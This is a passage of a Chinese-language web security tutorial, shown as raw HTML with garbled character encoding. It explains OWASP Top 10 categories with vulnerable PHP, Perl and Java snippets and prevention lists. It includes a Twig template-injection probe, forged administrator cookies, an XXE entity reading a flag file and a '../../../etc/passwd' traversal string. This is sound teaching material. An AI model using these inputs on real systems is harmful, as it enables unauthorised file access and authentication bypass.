single-quoted-string">'/../lib/Twig/Autoloader.php'</span><span class="token punctuation">;</span><span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ†</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span></span></code></pre><p>è¯¥æ®µä»£ç ä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨å‘é€ç”µå­é‚®ä»¶ä¹‹å‰è‡ªå®šä¹‰ä½¿ç”¨çš„åç§°ï¼Œä½†æ˜¯è‹¥æ”»å‡»è€…ä¸å°†é™æ€å€¼ä¼ é€’åˆ°æ¨¡æ¿ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨GETå‚æ•°åŠ¨æ€ç”Ÿæˆæ¨¡æ¿æœ¬èº«çš„ä¸€éƒ¨åˆ†nameï¼Œå¦‚ä¸‹æ‰€ç¤º</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//vulnerable-website.com/?name=IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</code></pre><p>ç”±äº <code>&#123;# comment #&#125;</code> ä½œä¸º Twig æ¨¡æ¿å¼•æ“çš„é»˜è®¤æ³¨é‡Šå½¢å¼ï¼Œæ‰€ä»¥åœ¨å‰ç«¯è¾“å‡ºçš„æ—¶å€™å¹¶ä¸ä¼šæ˜¾ç¤ºï¼Œè€Œ <code>&#123;&#123;2*8&#125;&#125;</code> ä½œä¸ºæ¨¡æ¿å˜é‡æœ€ç»ˆä¼šè¿”å› 16 ä½œä¸ºå…¶å€¼è¿›è¡Œæ˜¾ç¤ºï¼Œå› æ­¤å‰ç«¯æœ€ç»ˆä¼šè¿”å›å†…å®¹ <code>Hello IsVuln16OK</code></p><p>å‚è€ƒï¼š<a href="https://portswigger.net/kb/issues/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a>ï¼Œ<a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/">æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» (SSTI) ä¹‹æµ…æ</a></p><p>æœ¬ç«™æ¡ˆä¾‹ï¼š<a href="https://www.extrader.top/posts/47d18edd/">CTF-SSTI</a></p><h4 id="Prevent"><a href="#Prevent" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ä½¿ç”¨å®‰å…¨çš„API</li><li>ä½¿ç”¨â€œç™½åå•â€å¯¹æœåŠ¡å™¨ç«¯çš„è¾“å…¥è¿›è¡ŒéªŒè¯</li><li>ä½¿ç”¨ç‰¹å®šçš„è½¬ä¹‰è¯­æ³•æ¥è½¬ä¹‰ç‰¹æ®Šå­—</li><li>åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨LIMITå’Œå…¶ä»–SQLæ§ä»¶ï¼Œé˜²æ­¢SQLæ³¨å…¥çš„æƒ…å†µä¸‹å¤§é‡æ³„éœ²è®°å½•</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">A1:2017-Injection</a></p><h3 id="å¤±æ•ˆçš„èº«ä»½è®¤è¯"><a href="#å¤±æ•ˆçš„èº«ä»½è®¤è¯" class="headerlink" title="å¤±æ•ˆçš„èº«ä»½è®¤è¯"></a>å¤±æ•ˆçš„èº«ä»½è®¤è¯</h3><h4 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>é€šè¿‡ä¸è§„èŒƒçš„ä½¿ç”¨åº”ç”¨ç¨‹åºçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†åŠŸèƒ½ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿç ´è¯‘å¯†ç ï¼Œå¯†é’¥æˆ–ä¼šè¯ä»¤ç‰Œï¼Œæˆ–è€…æš‚æ—¶æˆ–æ°¸ä¹…çš„å†’å……å…¶å®ƒç”¨æˆ·çš„èº«ä»½</p><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> $<span class="token string">q = new CGI;if ($q->cookie('loggedin') ne "true") &#123;    if (! AuthenticateUser($q->param('username'), $q->param('password'))) &#123;    ExitError("Error: you need to log in first");    &#125;else &#123;        # Set loggedin and user cookies.        $q->cookie(        -name =</span><span class="token operator">></span> <span class="token string">'loggedin'</span><span class="token punctuation">,</span>        <span class="token operator">-</span>value <span class="token operator">=></span> <span class="token string">'true'</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token string">q->cookie(        -</span>name <span class="token operator">=></span> <span class="token string">'user'</span><span class="token punctuation">,</span>        <span class="token operator">-</span>value <span class="token operator">=></span> $<span class="token string">q->param('username')        );    &#125;&#125;if ($q-</span><span class="token operator">></span>cookie<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span> <span class="token operator">eq</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>DoAdministratorTasks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä»¥ä¸Šä»£ç æ—¨åœ¨ç¡®ä¿ç”¨æˆ·å·²ç»ç™»å½•ï¼Œå¦‚æœæœªç™»å½•ï¼Œåˆ™ä»£ç å°†ä½¿ç”¨ç”¨æˆ·æä¾›çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¦‚æœæˆåŠŸï¼Œå®ƒå°†ç™»å½•ç”¨æˆ·å¹¶å°†ç”¨æˆ·çš„cookieè®¾ç½®ä¸ºâ€œè®°ä½â€ç”¨æˆ·å·²ç»ç™»å½•ï¼Œæœ€åï¼Œå¦‚æœç™»å½•çš„ç”¨æˆ·çš„cookieä¸­å…·æœ‰â€œç®¡ç†å‘˜â€ç”¨æˆ·åï¼Œåˆ™ä»£ç å°†æ‰§è¡Œç®¡ç†å‘˜ä»»åŠ¡ã€‚</p><p>ç„¶è€Œï¼Œè¿™æ®µä»£ç æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œæ”»å‡»è€…å¯ä»¥ç‹¬ç«‹è®¾ç½®cookieï¼Œä½¿å¾—ä»£ç ä¸ä¼šæ£€æŸ¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”è¿˜å¯ä»¥ä¼ªé€ â€œç®¡ç†å‘˜â€èº«ä»½è¿›è¡Œæ“ä½œï¼Œä¼ªé€ çš„requestå¤´å¦‚ä¸‹ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/cgi-bin/vulnerable.cgi</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Cookie:</span> user=Administrator<span class="token header-name keyword">Cookie:</span> loggedin=true</code></pre><p>é€šè¿‡å°†ç™»å½•çš„cookie loggedinè®¾ç½®ä¸ºâ€œtrueâ€ï¼Œæ”»å‡»è€…å°†ç»•è¿‡æ•´ä¸ªèº«ä»½è®¤è¯ï¼›é€šè¿‡ä½¿cookie userä¸ºâ€œAdministratorâ€å€¼ï¼Œä»è€Œè·å¾—ç®¡ç†å‘˜æƒé™</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></p><h4 id="Prevent-1"><a href="#Prevent-1" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>å®æ–½å¤šå› ç´ èº«ä»½è®¤è¯ï¼Œä»¥é˜²æ­¢è‡ªåŠ¨è¿›è¡Œå‡­æ®å¡«å……ï¼Œæš´åŠ›ç ´è§£å’Œå‡­æ®é‡ç”¨æ”»å‡»</li><li>ä¸é€‚ç”¨é»˜è®¤å¯†ç ï¼Œå¼±å¯†ç ï¼Œå°¤å…¶æ˜¯å¯¹äºç®¡ç†å‘˜ç”¨æˆ·</li><li>å®æ–½å¯†ç æ£€æµ‹ï¼Œé™åˆ¶å¯†ç é•¿åº¦ï¼Œå¤æ‚æ€§</li><li>é™åˆ¶ç™»å½•å¤±è´¥æ¬¡æ•°ï¼Œé¢‘ç¹çš„ç™»å½•å°è¯•ï¼Œè®°å½•æ•…éšœï¼Œå¹¶åœ¨æ£€æµ‹åˆ°æ”»å‡»æ—¶æé†’ç®¡ç†å‘˜</li><li>é€‚ç”¨æœåŠ¡å™¨ç«¯å®‰å…¨çš„å†…ç½®ä¼šè¯ç®¡ç†å™¨</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">A2:2017-Broken Authentication</a></p><h3 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h3><h4 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>æˆ‘ä»¬çš„æ•æ„Ÿä¿¡æ¯åŒ…æ‹¬å¯†ç ã€è´¢åŠ¡æ•°æ®ã€åŒ»ç–—æ•°æ®ç­‰ï¼Œç”±äºwebåº”ç”¨æˆ–è€…APIæœªåŠ å¯†æˆ–ä¸æ­£ç¡®çš„ä¿æŠ¤æ•æ„Ÿæ•°æ®ï¼Œè¿™äº›æ•°æ®ææ˜“é­åˆ°æ”»å‡»è€…åˆ©ç”¨ï¼Œæ”»å‡»è€…å¯èƒ½ä½¿ç”¨è¿™äº›æ•°æ®æ¥è¿›è¡Œä¸€äº›çŠ¯ç½ªè¡Œä¸ºï¼Œå› æ­¤ï¼ŒæœªåŠ å¯†çš„ä¿¡æ¯ææ˜“é­åˆ°ç ´åå’Œåˆ©ç”¨ï¼Œæˆ‘ä»¬åº”è¯¥åŠ å¼ºå¯¹æ•æ„Ÿæ•°æ®çš„ä¿æŠ¤ï¼Œwebåº”ç”¨åº”è¯¥åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®ã€å­˜å‚¨çš„æ•°æ®ä»¥åŠå’Œæµè§ˆå™¨çš„äº¤äº’æ—¶çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¿è¯æ•°æ®å®‰å…¨ã€‚</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">persistLogin</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token operator">=></span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"userdata"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­¤ä»£ç å°†ç”¨æˆ·çš„ä¿¡æ¯å†™å…¥cookieï¼Œå› æ­¤ç”¨æˆ·ä»¥åä¸å¿…å†æ¬¡ç™»å½•</p><p>è¯¥ä»£ç ä»¥çº¯æ–‡æœ¬çš„æ ¼å¼å°†ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç å­˜å‚¨åœ¨è®¡ç®—æœºçš„cookieä¸­ï¼Œå¦‚æœæ”»å‡»è€…ç ´åäº†ç”¨æˆ·çš„è®¡ç®—æœºï¼Œåˆ™è¿™å°†å…¬å¼€ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ï¼Œå³ä½¿ç”¨æˆ·çš„è®¡ç®—æœºæ²¡æœ‰å—åˆ°æŸå®³ï¼Œå½“è¿™ç§å¼±ç‚¹åŠ ä¸Šè·¨ç«™ç‚¹è„šæœ¬å¯èƒ½ä½¿æ”»å‡»è€…è¿œç¨‹å¤åˆ¶cookie</p><h4 id="Prevent-2"><a href="#Prevent-2" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>å¯¹åº”ç”¨ç¨‹åºå¤„ç†ï¼Œå­˜å‚¨æˆ–ä¼ è¾“çš„æ•°æ®è¿›è¡Œåˆ†ç±»ã€‚</li><li>ä¸å­˜å‚¨ä¸å¿…è¦çš„æ•æ„Ÿæ•°æ®ï¼Œå°½å¿«å°†å…¶ä¸¢å¼ƒ</li><li>ç¡®ä¿å¯¹é™æ€çš„æ‰€æœ‰æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”ä½¿ç”¨æœ€æ–°ä¸”åŠŸèƒ½å¼ºå¤§çš„æ ‡å‡†ç®—æ³•ï¼Œåè®®å’Œå¯†é’¥</li><li>ä½¿ç”¨å®‰å…¨åè®®å¯¹ä¼ è¾“ä¸­çš„æ‰€æœ‰æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¦‚httpsï¼Œhsts</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">A3:2017-Sensitive Data Exposure</a></p><h3 id="XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰"><a href="#XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰" class="headerlink" title="XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰"></a>XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰</h3><h4 id="ç®€ä»‹-3"><a href="#ç®€ä»‹-3" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>XXE å…¨ç§°ä¸ºXML External Entity attack å³XML<a href="https://baike.baidu.com/item/å¯æ‰©å±•æ ‡è®°è¯­è¨€/2885849?fromtitle=xml&fromid=86251&fr=aladdin">(å¯æ‰©å±•æ ‡è®°è¯­è¨€)</a> å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼Œæ—©æœŸæˆ–é…ç½®é”™è¯¯çš„XMLå¤„ç†å™¨è¯„ä¼°äº†XMLæ–‡ä»¶å¤–éƒ¨å®ä½“å¼•ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´çªƒå–URI(<a href="https://baike.baidu.com/item/URI/16481812">ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦</a>)æ–‡ä»¶å¤„ç†å™¨çš„å†…éƒ¨æ–‡ä»¶å’Œå…±äº«æ–‡ä»¶ã€ç›‘å¬å†…éƒ¨æ‰«æç«¯å£ã€æ‰§è¡Œè¿œç¨‹ä»£ç å’Œå®æ–½<a href="https://baike.baidu.com/item/æ‹’ç»æœåŠ¡æ”»å‡»/421896?fr=aladdin">æ‹’ç»æœåŠ¡æ”»å‡»</a>ã€‚</p><h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///d://flag.txt" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>å…·ä½“å‚è€ƒæœ¬ç«™ï¼š<a href="https://www.extrader.top/posts/55c267c8/">XXEå­¦ä¹ ç¬”è®°</a></p><h4 id="Prevent-3"><a href="#Prevent-3" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>å°½å¯èƒ½ä½¿ç”¨ä¸å¤ªå¤æ‚çš„æ•°æ®æ ¼å¼ï¼ˆå¦‚ï¼šJSONï¼‰é¿å…æ•æ„Ÿæ•°æ®çš„åºåˆ—åŒ–</li><li>ä¿®è¡¥æˆ–å‡çº§åº”ç”¨ç¨‹åºæˆ–åŸºç¡€æ“ä½œç³»ç»Ÿä¸Šæ­£åœ¨ä½¿ç”¨çš„æ‰€æœ‰XMLå¤„ç†å™¨å’Œåº“</li><li>åœ¨åº”ç”¨ç¨‹åºçš„æ‰€æœ‰XMLè§£æå™¨ä¸­ç¦ç”¨XMLå¤–éƒ¨å®ä½“å’ŒDTDå¤„ç†ã€‚</li><li>åœ¨æœåŠ¡å™¨ç«¯å®æ–½â€œç™½åå•â€è¾“å…¥éªŒè¯ï¼Œè¿‡æ»¤æˆ–æ¸…ç†æ“ä½œ</li></ol><h3 id="å¤±æ•ˆçš„è®¿é—®æ§åˆ¶"><a href="#å¤±æ•ˆçš„è®¿é—®æ§åˆ¶" class="headerlink" title="å¤±æ•ˆçš„è®¿é—®æ§åˆ¶"></a>å¤±æ•ˆçš„è®¿é—®æ§åˆ¶</h3><h4 id="ç®€ä»‹-4"><a href="#ç®€ä»‹-4" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>é€šè¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œå¯ä»¥è®¿é—®å…¶ä»–ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼Œæ²¡æœ‰å®æ–½æ°å½“çš„è®¿é—®æƒé™ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å»æŸ¥çœ‹æœªæˆæƒçš„åŠŸèƒ½å’Œæ•°æ®ï¼Œä¾‹ï¼šè®¿é—®ç”¨æˆ·çš„è´¦æˆ·ã€æ•æ„Ÿæ–‡ä»¶ã€è·å–å’Œæ­£å¸¸ç”¨æˆ·ç›¸åŒçš„æƒé™ç­‰.</p><h4 id="Example-4"><a href="#Example-4" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> <span class="token variable">$dataPath</span> <span class="token operator">=</span> <span class="token string">"/users/cwe/profiles"</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$username</span> <span class="token operator">=</span> param<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$profilePath</span> <span class="token operator">=</span> <span class="token variable">$dataPath</span> <span class="token operator">.</span> <span class="token string">"/"</span> <span class="token operator">.</span> <span class="token variable">$username</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"&lt;$profilePath"</span><span class="token punctuation">)</span> <span class="token operator">||</span> ExitError<span class="token punctuation">(</span><span class="token string">"profile read error: $profilePath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span> <span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">print</span> <span class="token string">"&lt;li>$_&lt;/li>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span> <span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šä»£ç å¯èƒ½é€‚ç”¨äºç¤¾äº¤ç½‘ç»œåº”ç”¨ç¨‹åºï¼Œå…¶ä¸­ç”¨æˆ·çš„ä¸ªäººèµ„æ–™ä¿¡æ¯éƒ½å­˜å‚¨åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªç›®å½•ä¸­</p><p>å°½ç®¡ç¨‹åºå‘˜æ‰“ç®—è®¿é—®â€œ/users/cwe/profiles/aliceâ€ä¹‹ç±»çš„æ–‡ä»¶ï¼Œä½†æ²¡æœ‰éªŒè¯ä¼ å…¥çš„ç”¨æˆ·å‚æ•°ã€‚æ”»å‡»è€…å¯èƒ½ä¼šæä¾›ä»¥ä¸‹å­—ç¬¦ä¸²ï¼š</p><pre class="language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>è¯¥ç¨‹åºå°†ç”Ÿæˆå¦‚ä¸‹çš„é…ç½®æ–‡ä»¶è·¯å¾„åï¼š</p><pre class="language-none"><code class="language-none">&#x2F;users&#x2F;cwe&#x2F;profiles&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>æ‰“å¼€æ–‡ä»¶åï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨è·¯å¾„è§„èŒƒåŒ–æœŸé—´è§£æâ€œ ../â€ï¼Œå¹¶å®é™…è®¿é—®æ­¤æ–‡ä»¶ï¼š</p><pre class="language-none"><code class="language-none">&#x2F;etc&#x2F;passwd</code></pre><p>ç»“æœï¼Œæ”»å‡»è€…å¯ä»¥é˜…è¯»å¯†ç æ–‡ä»¶çš„æ•´ä¸ªæ–‡æœ¬</p><h4 id="Prevent-4"><a href="#Prevent-4" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>é™¤å…¬å…±èµ„æºå¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‹’ç»</li><li>ä¸€æ¬¡å®æ–½è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œå¹¶åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­é‡å¤ä½¿ç”¨å®ƒä»¬ï¼ŒåŒ…æ‹¬æœ€å¤§ç¨‹åº¦åœ°å‡å°‘<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">CORS</a>çš„ä½¿ç”¨ã€‚</li><li>ç¦ç”¨WebæœåŠ¡å™¨ç›®å½•åˆ—è¡¨ï¼Œå¹¶ç¡®ä¿Webæ ¹ç›®å½•ä¸­ä¸å­˜åœ¨æ–‡ä»¶å…ƒæ•°æ®ï¼ˆä¾‹å¦‚.gitï¼‰å’Œå¤‡ä»½æ–‡ä»¶ã€‚</li><li>é™é€ŸAPIå’Œæ§åˆ¶å™¨è®¿é—®æƒé™ï¼Œä»¥æœ€å¤§ç¨‹åº¦å‡å°‘è‡ªåŠ¨æ”»å‡»å·¥å…·å¸¦æ¥çš„å±å®³ã€‚</li></ol><h3 id="å®‰å…¨é…ç½®é”™è¯¯"><a href="#å®‰å…¨é…ç½®é”™è¯¯" class="headerlink" title="å®‰å…¨é…ç½®é”™è¯¯"></a>å®‰å…¨é…ç½®é”™è¯¯</h3><h4 id="ç®€ä»‹-5"><a href="#ç®€ä»‹-5" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>å®‰å…¨é…ç½®é”™è¯¯æ˜¯æ¯”è¾ƒå¸¸è§çš„æ¼æ´ï¼Œç”±äºæ“ä½œè€…çš„ä¸å½“é…ç½®(é»˜è®¤é…ç½®ï¼Œä¸´æ—¶é…ç½®ï¼Œå¼€æºäº‘å­˜å‚¨ï¼Œhttpæ ‡å¤´é…ç½®ï¼Œä»¥åŠåŒ…å«æ•æ„Ÿä¿¡æ¯çš„è¯¦ç»†é”™è¯¯)ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›é…ç½®è·å–åˆ°æ›´é«˜çš„æƒé™ï¼Œå®‰å…¨é…ç½®é”™è¯¯å¯ä»¥å‘ç”Ÿåœ¨å„ä¸ªå±‚é¢ï¼ŒåŒ…å«å¹³å°ã€webæœåŠ¡å™¨ã€åº”ç”¨æœåŠ¡å™¨ã€æ•°æ®åº“ã€æ¶æ„å’Œä»£ç ã€‚</p><h4 id="Example-5"><a href="#Example-5" class="headerlink" title="Example"></a>Example</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"config.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> password <span class="token operator">=</span> prop<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> usr<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸‹ä»£ç ä»å±æ€§æ–‡ä»¶ä¸­è¯»å–å¯†ç ï¼Œå¹¶ä½¿ç”¨è¯¥å¯†ç è¿æ¥åˆ°æ•°æ®åº“ã€‚</p><p>è¯¥ä»£ç å°†æˆåŠŸè¿è¡Œï¼Œä½†æ˜¯æœ‰æƒè®¿é—®config.propertiesçš„ä»»ä½•äººéƒ½å¯ä»¥è¯»å–å¯†ç çš„å€¼ã€‚å¦‚æœæ”»å‡»è€…æœ‰æƒè®¿é—®æ­¤ä¿¡æ¯ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å®ƒæ¥å…¥ä¾µç³»ç»Ÿã€‚</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/256.html">CWE-256: Unprotected Storage of Credentials</a></p><h4 id="Prevent-5"><a href="#Prevent-5" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>è‡ªåŠ¨åŒ–å®‰è£…éƒ¨ç½²ï¼Œä¿è¯å¼€å‘ï¼ŒQAï¼Œäº§å“ç¯å¢ƒçš„é…ç½®å°½é‡ç›¸åŒï¼Œå‡å°‘éƒ¨ç½²ä¸€ä¸ªæ–°å®‰å…¨ç¯å¢ƒçš„è€—è´¹ï¼Œ</li><li>åŠæ—¶äº†è§£å¹¶éƒ¨ç½²æ¯ä¸ªç¯å¢ƒçš„è½¯ä»¶æ›´æ–°å’Œè¡¥ä¸ä¿¡æ¯</li><li>ä½¿ç”¨æä¾›æœ‰æ•ˆåˆ†ç¦»çš„å®‰å…¨æ€§å¼ºå¤§çš„åº”ç”¨ç¨‹åºæ¶æ„</li><li>å®æ–½æ¼æ´æ‰«æå’Œå®‰å…¨å®¡è®¡ï¼Œä»¥å¸®åŠ©æ£€æŸ¥é”™è¯¯çš„é…ç½®æˆ–è€…æœªå®‰è£…çš„è¡¥ä¸</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">A6ï¼š2017-å®‰å…¨æ€§é”™è¯¯é…ç½®</a></p><h3 id="è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰"><a href="#è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰" class="headerlink" title="è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰"></a>è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰</h3><h4 id="ç®€ä»‹-6"><a href="#ç®€ä»‹-6" class="headerlink" 